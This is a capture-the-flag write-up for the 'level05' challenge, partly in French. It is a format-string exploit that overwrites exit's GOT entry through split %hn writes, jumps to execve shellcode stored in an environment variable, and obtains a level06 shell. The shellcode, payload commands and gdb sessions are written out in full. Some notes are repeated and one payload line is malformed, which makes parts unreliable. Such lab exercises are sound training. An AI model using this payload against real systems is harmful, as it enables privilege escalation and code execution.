# level05

We can see that program takes an input and XOR each byte with 32 if it is between 'A' and 'Z'. It is a `toLower` like function:

```gdb
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048472 in main ()
(gdb) c
Continuing.
AAAAAAAAAAA

Breakpoint 2, 0x08048500 in main ()
(gdb) x/s $esp+0x28
0xffffd668:      'a' <repeats 11 times>, "\n"
```

Then, it pass the result string in `printf` as the only argument.

We try to found the direct access parameter:

```bash
level05@OverRide:~$ (python -c "print 'aaaa' + '%p ' * 30";cat) | ./level05  
aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070  
```

Our string is printed at the 10th parameter.

We put our shellcode in an environment variable and find its address:

```bash
export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```

```gdb
(gdb) x/s *((char **)environ+0)
0xffffd72f:      "EXPLOIT=\220\220\220"...

(gdb) p/d 0xffffd72f+200
$1 = 4294957047
(gdb) p/x 0xffffd72f+200
$2 = 0xffffd7f7
```

(gdb)  p/d 0xffffd74a+200
$1 = 4294957074
(gdb)  p/d 0xffffd702+200
$2 = 4294957002

(gdb) p/x 0xffffd74a+200  
$3 = 0xffffd812
(gdb) p/x 0xffffd702+200
$4 = 0xffffd7ca

(gdb) p/d 0xd812  
$4 = 55314  
(gdb) p/d 0xd812-8  
$5 = 55306  
  
gdb-peda$ p/d 0xffff  
$5 = 65535  
(gdb) p/d 0xffff-55314  
$6 = 10221  
```
  
Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
  
export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  

(gdb) x/s *((char **)environ+0)  
0xffffd74a:      "EXPLOIT=<...>"  
  
adresse exploit: 0xffffd74a  
(gdb) p/d 0xffffd74a+200  
$1 = 4294957074  
  
(gdb) p/x 0xffffd74a+200  
$2 = 0xffffd812  
(gdb) x/s 0xffffd812  
  
We get exit function address:

```gdb
(gdb) info function exit  
All functions matching regular expression "exit":  
  
Non-debugging symbols:  
0x08048370  exit  
0x08048370  exit@plt  
...
(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
```
  
(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957070\$x + '%10\$n'")
0x0804847a in main ()
(gdb) x/wx $esp
0xffffd690:     0xffffd6b8
(gdb) x/5wx 0xffffd6b8
0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
0xffffd6c8:     0x00000a6e
Breakpoint 2, 0x08048507 in main ()
(gdb) x/5wx 0xffffd6b8
0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
0xffffd6c8:     0x00000a6e

Nous pouvons voir que les bytes que nous avons rentrer dans le fgets() ne sont pas modifier, mais que nous n'avons pas jump sur notre shellcode
  
Nous pouvons voir sur ce document, que les valeurs des int pris en compte par printf ont une limite :  
https://cs155.stanford.edu/papers/formatstring-1.2.pdf  
  
Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite. 
  
```bash
(gdb) p/d 0xd812  
$4 = 55314  
(gdb) p/d 0xd812-8  
$5 = 55306  
  
gdb-peda$ p/d 0xffff  
$5 = 65535  
(gdb) p/d 0xffff-55314  
$6 = 10221  
  
```

=> 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100  
(gdb) x/wx $esp  
0xffffd470:     0xffffd498  
(gdb) x/s 0xffffd498  
0xffffd498:      ""  
  
(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%.55306u%10\$hn' + '%.10221u%11\$hn'")  
=> 0x08048507 <+195>:   call   0x8048340 <printf@plt>
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:     push   0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) disas 0x80497e0
Dump of assembler code for function exit@got.plt:
   0x080497e0 <+0>:     jbe    0x8049765 <_DYNAMIC+105>
   0x080497e2 <+2>:     add    al,0x8
End of assembler dump.

=> 0x0804850c <+200>:   mov    DWORD PTR [esp],0x0
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:     push   0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) disas 0x80497e0
Dump of assembler code for function exit@got.plt:
   0x080497e0 <+0>:     adc    bl,al
   0x080497e2 <+2>:     (bad)  
   0x080497e3 <+3>:     jmp    DWORD PTR [eax]
End of assembler dump.
  
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05  
<...>  
whoami  
level06  
